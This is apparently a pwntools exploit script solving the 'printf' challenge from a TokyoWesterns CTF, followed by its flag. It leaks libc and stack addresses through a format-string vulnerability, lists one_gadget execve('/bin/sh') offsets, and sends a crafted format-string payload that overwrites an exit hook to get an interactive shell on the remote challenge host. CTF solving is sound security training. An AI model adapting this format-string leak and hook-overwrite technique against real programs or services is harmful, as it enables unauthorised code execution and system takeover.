from pwn import *
import sys

context.log_level='DEBUG'

if len(sys.argv) == 2:
    r = remote('printf.chal.ctf.westerns.tokyo', 10001)
    is_remote = True
else:
    r = process(['./ld-linux-x86-64.so.2', './printf'], env={'LD_LIBRARY_PATH':'.'})
    is_remote = False

# Leak
r.recvuntil('name?\n')
r.sendline(' '.join(['%lx' for _ in xrange(43)]))
r.recvuntil('Hi, \n')
s = r.recvuntil('\n')
s = s.strip().split()

LIBC_START_MAIN_OFF = 0x26b6b
TO_RET_OFF = 27 * 8 if is_remote else 26 * 8
#STACK_TO s
libc_base = int(s[42], 16) - LIBC_START_MAIN_OFF
stack_ret_addr = int(s[42 - 3], 16) - TO_RET_OFF

log.info("%x %x", libc_base, stack_ret_addr)

r.recvuntil('\n')

#r.sendline('%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%sAA'+p64(stack - int(sys.argv[1]) * 8))

# Gadgets
"""
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

pause()

EXIT_HOOK_OFF = 0x1e66c8
STACK_TOP_OFF = 0x2a8
MAGIC_OFF = 0xe2383
stack_top = stack_ret_addr - STACK_TOP_OFF
magic_addr = libc_base + MAGIC_OFF
exit_hook_addr = libc_base + EXIT_HOOK_OFF

pad = stack_top - exit_hook_addr
payload = 'AAAABBBB{}%y%{}x'.format(p64(magic_addr)[:6], pad - 0x20 + 2)

r.sendline(payload)

r.interactive()

# ayy
# TWCTF{Pudding_Pudding_Pudding_purintoehu}
